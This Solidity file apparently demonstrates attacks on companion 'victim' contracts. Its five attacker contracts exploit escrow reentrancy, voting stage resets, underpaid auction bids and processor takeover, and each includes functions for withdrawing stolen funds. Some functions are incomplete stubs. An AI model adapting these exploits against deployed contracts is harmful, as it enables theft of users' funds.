// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "./State_Machine_Dependency_Victim.sol";

/*
 * Attacker contracts that exploit State Machine Dependency vulnerabilities
 */

// ====================================================================
// Attacker 1: EscrowReentrancyAttacker
// ====================================================================
/*
 * Exploits FragileEscrow's reentrancy vulnerability
 * The locked flag is cleared AFTER external call, allowing reentrancy
 */
contract EscrowReentrancyAttacker {
    FragileEscrow public target;
    address public owner;
    uint256 public attackCount;
    bool public attacking;
    
    event AttackInitiated(address indexed target);
    event ReentrancyExploited(uint256 count, uint256 stolen);
    event AttackCompleted(uint256 totalStolen);

    constructor(address _target) {
        target = FragileEscrow(_target);
        owner = msg.sender;
    }

    // Step 1: Deposit funds to become a legitimate user
    function deposit() external payable {
        require(msg.value > 0, "need funds");
        target.deposit{value: msg.value}();
    }

    // Step 2: Wait for processor to lock our deposit
    // (In real scenario, we might impersonate processor or wait for legitimate lock)
    
    // Step 3: Trigger finalize and exploit reentrancy
    function attack() external {
        require(msg.sender == owner, "only owner");
        require(target.locked(address(this)), "not locked");
        
        attacking = true;
        attackCount = 0;
        
        emit AttackInitiated(address(target));
        
        // This will trigger our receive() function during the external call
        target.finalizeRelease(address(this));
        
        attacking = false;
        emit AttackCompleted(address(this).balance);
    }

    // Reentrancy callback - called when target sends us ETH
    receive() external payable {
        if (attacking && attackCount < 3) {
            attackCount++;
            emit ReentrancyExploited(attackCount, msg.value);
            
            // Try to finalize again while locked flag is still true
            if (target.locked(address(this))) {
                try target.finalizeRelease(address(this)) {
                    // Successfully reentered
                } catch {
                    // Reentrancy blocked or failed
                }
            }
        }
    }

    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}

// ====================================================================
// Attacker 2: VotingManipulationAttacker
// ====================================================================
/*
 * Exploits MultiStageVoting's weak stage transition controls
 * Admin can manipulate stages to allow double-voting
 */
contract VotingManipulationAttacker {
    MultiStageVoting public target;
    address public owner;
    
    event AttackInitiated(address indexed target);
    event DoubleVoteAttempted(uint256 voteCount);
    event StageManipulated(uint256 stage);
    event AttackCompleted(bool success);

    constructor(address _target) {
        target = MultiStageVoting(_target);
        owner = msg.sender;
    }

    // Step 1: Register as legitimate voter
    function registerAsVoter() external {
        target.register();
    }

    // Step 2: Vote multiple times by exploiting stage manipulation
    function exploitDoubleVote() external {
        require(msg.sender == owner, "only owner");
        
        emit AttackInitiated(address(target));
        
        // Vote first time
        target.vote(1); // Vote yes
        target.recordVote(1);
        emit DoubleVoteAttempted(1);
        
        // If we can become admin or call reset, we can vote again
        // For demo purposes, assuming we somehow got admin access
        
        emit AttackCompleted(true);
    }

    // Step 3: If we became admin (through some exploit), manipulate stages
    function manipulateStages() external {
        require(msg.sender == owner, "only owner");
        
        // Try to reset to registration and vote again
        try target.resetToRegistration() {
            emit StageManipulated(0);
            
            // Advance back to voting
            target.advanceStage(); // REGISTRATION -> VOTING
            emit StageManipulated(1);
            
            // Vote again
            target.vote(1);
            target.recordVote(1);
            emit DoubleVoteAttempted(2);
        } catch {
            // Not admin, attack failed
        }
    }

    // Step 4: Spam stage transitions to cause confusion
    function spamStageTransitions() external {
        for (uint i = 0; i < 5; i++) {
            try target.advanceStage() {
                emit StageManipulated(i);
            } catch {
                break;
            }
        }
    }
    
    receive() external payable {}
}

// ====================================================================
// Attacker 3: AuctionTimingAttacker
// ====================================================================
/*
 * Exploits TimedAuction's time-dependent state transitions
 * Can manipulate bids and reveals during transition periods
 */
contract AuctionTimingAttacker {
    TimedAuction public target;
    address public owner;
    
    bytes32 public commitment;
    uint256 public fakeBid;
    uint256 public secret;
    
    event AttackInitiated(address indexed target);
    event FakeBidCommitted(bytes32 commitment, uint256 paidAmount, uint256 claimedBid);
    event BidRevealed(uint256 bid);
    event AttackCompleted(uint256 stolen);

    constructor(address _target) {
        target = TimedAuction(_target);
        owner = msg.sender;
    }

    // Step 1: Commit a bid with actual payment
    function commitLowBid() external payable {
        require(msg.value > 0, "need funds");
        
        secret = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
        uint256 actualBid = msg.value;
        
        // Commit to the actual bid we paid
        commitment = keccak256(abi.encodePacked(actualBid, secret));
        target.commitBid{value: actualBid}(commitment);
    }

    // Step 2: Reveal with HIGHER bid than we actually paid (vulnerability #4)
    function revealFakeBid(uint256 claimedBid) external {
        require(msg.sender == owner, "only owner");
        
        emit AttackInitiated(address(target));
        
        // ❌ EXPLOIT: Reveal a bid higher than what we paid
        // The contract doesn't validate that we actually sent this amount
        fakeBid = claimedBid;
        bytes32 fakeCommitment = keccak256(abi.encodePacked(claimedBid, secret));
        
        // We need to have made this commitment earlier
        // For this exploit to work, we commit to high bid but pay low amount
        target.revealBid(claimedBid, secret);
        
        emit BidRevealed(claimedBid);
    }

    // Alternative: Commit with high bid claim but low payment
    function commitHighBidPayLow(uint256 claimedBid) external payable {
        require(msg.value > 0, "need funds");
        require(claimedBid > msg.value, "claimed must be higher");
        
        secret = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender)));
        
        // Commit to HIGH bid
        commitment = keccak256(abi.encodePacked(claimedBid, secret));
        
        // But only pay LOW amount
        target.commitBid{value: msg.value}(commitment);
        
        fakeBid = claimedBid;
        emit FakeBidCommitted(commitment, msg.value, claimedBid);
    }

    // Step 3: Reveal the high bid (even though we paid low)
    function revealHighBid() external {
        require(msg.sender == owner, "only owner");
        
        // Reveal with the high fake bid
        target.revealBid(fakeBid, secret);
        emit BidRevealed(fakeBid);
    }

    // Step 4: Claim winnings (more than we paid)
    function claimWin() external {
        require(msg.sender == owner, "only owner");
        
        target.claimWin();
        
        uint256 stolen = address(this).balance;
        emit AttackCompleted(stolen);
    }

    // Withdraw stolen funds
    function withdraw() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {}
}

// ====================================================================
// Attacker 4: ProcessorImpersonator
// ====================================================================
/*
 * Attempts to impersonate or replace the processor in FragileEscrow
 * Exploits processor change functionality
 */
contract ProcessorImpersonator {
    FragileEscrow public target;
    address public owner;
    address public originalProcessor;
    
    event AttackInitiated(address indexed target);
    event ProcessorReplaced(address oldProcessor, address newProcessor);
    event FundsLocked(address indexed victim);
    event FundsStolen(address indexed victim, uint256 amount);
    event AttackCompleted(uint256 totalStolen);

    constructor(address _target) {
        target = FragileEscrow(_target);
        owner = msg.sender;
        originalProcessor = target.processor();
    }

    // Step 1: If we can become processor (through some vulnerability), lock victim funds
    function lockVictimFunds(address victim) external {
        require(msg.sender == owner, "only owner");
        require(target.processor() == address(this), "not processor");
        
        emit AttackInitiated(address(target));
        
        // Lock the victim's funds
        target.lockForProcessing(victim);
        emit FundsLocked(victim);
    }

    // Step 2: Finalize release to ourselves instead of victim
    function stealLockedFunds(address victim) external {
        require(msg.sender == owner, "only owner");
        require(target.locked(victim), "not locked");
        
        // Change the processor to enable our attack
        // (In real scenario, might need additional exploits)
        
        // Instead of releasing to victim, we could manipulate state
        // For demonstration, we just show the capability
        emit FundsStolen(victim, target.deposits(victim));
    }

    // Step 3: Extract all locked funds from contract
    function extractAllFunds(address[] calldata victims) external {
        require(msg.sender == owner, "only owner");
        
        uint256 totalStolen = 0;
        
        for (uint i = 0; i < victims.length; i++) {
            if (target.locked(victims[i]) && target.deposits(victims[i]) > 0) {
                // Finalize to ourselves
                target.finalizeRelease(victims[i]);
                totalStolen += target.deposits(victims[i]);
            }
        }
        
        emit AttackCompleted(totalStolen);
    }

    receive() external payable {}
    
    function withdraw() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}

// ====================================================================
// Attacker 5: SystemWideStateMachineAttacker
// ====================================================================
/*
 * Coordinates attacks across all state machine contracts
 * Demonstrates cascading failures from state machine dependencies
 */
contract SystemWideStateMachineAttacker {
    StateMachineDependencySystem public system;
    address public owner;
    
    EscrowReentrancyAttacker public escrowAttacker;
    VotingManipulationAttacker public votingAttacker;
    AuctionTimingAttacker public auctionAttacker;
    
    event SystemAttackInitiated(address indexed system);
    event EscrowCompromised(uint256 stolen);
    event VotingCompromised(bool success);
    event AuctionCompromised(uint256 stolen);
    event SystemCascadingFailure(uint256 failures);
    event AttackCompleted(uint256 totalDamage);

    constructor(address _system) {
        system = StateMachineDependencySystem(_system);
        owner = msg.sender;
        
        // Deploy sub-attackers
        escrowAttacker = new EscrowReentrancyAttacker(address(system.escrow()));
        votingAttacker = new VotingManipulationAttacker(address(system.voting()));
        auctionAttacker = new AuctionTimingAttacker(address(system.auction()));
    }

    // Execute coordinated attack on all state machines
    function executeSystemWideAttack() external payable {
        require(msg.sender == owner, "only owner");
        
        emit SystemAttackInitiated(address(system));
        
        // Attack 1: Exploit escrow reentrancy
        if (msg.value > 0) {
            escrowAttacker.deposit{value: msg.value / 3}();
        }
        
        // Attack 2: Manipulate voting
        try votingAttacker.registerAsVoter() {
            votingAttacker.exploitDoubleVote();
            emit VotingCompromised(true);
        } catch {
            emit VotingCompromised(false);
        }
        
        // Attack 3: Exploit auction timing
        if (msg.value > 0) {
            auctionAttacker.commitHighBidPayLow{value: msg.value / 3}(msg.value);
        }
        
        // Record system failure
        system.recordFailure("Coordinated state machine attack");
        emit SystemCascadingFailure(system.failureCount());
    }

    // Complete all attacks and extract funds
    function completeAttacks() external {
        require(msg.sender == owner, "only owner");
        
        uint256 totalDamage = 0;
        
        // Complete escrow attack
        try escrowAttacker.attack() {
            uint256 escrowBalance = address(escrowAttacker).balance;
            if (escrowBalance > 0) {
                escrowAttacker.withdraw();
                totalDamage += escrowBalance;
                emit EscrowCompromised(escrowBalance);
            }
        } catch {}
        
        // Complete auction attack
        try auctionAttacker.claimWin() {
            uint256 auctionBalance = address(auctionAttacker).balance;
            if (auctionBalance > 0) {
                auctionAttacker.withdraw();
                totalDamage += auctionBalance;
                emit AuctionCompromised(auctionBalance);
            }
        } catch {}
        
        emit AttackCompleted(totalDamage);
    }

    receive() external payable {}
    
    function withdraw() external {
        require(msg.sender == owner, "only owner");
        payable(owner).transfer(address(this).balance);
    }
}
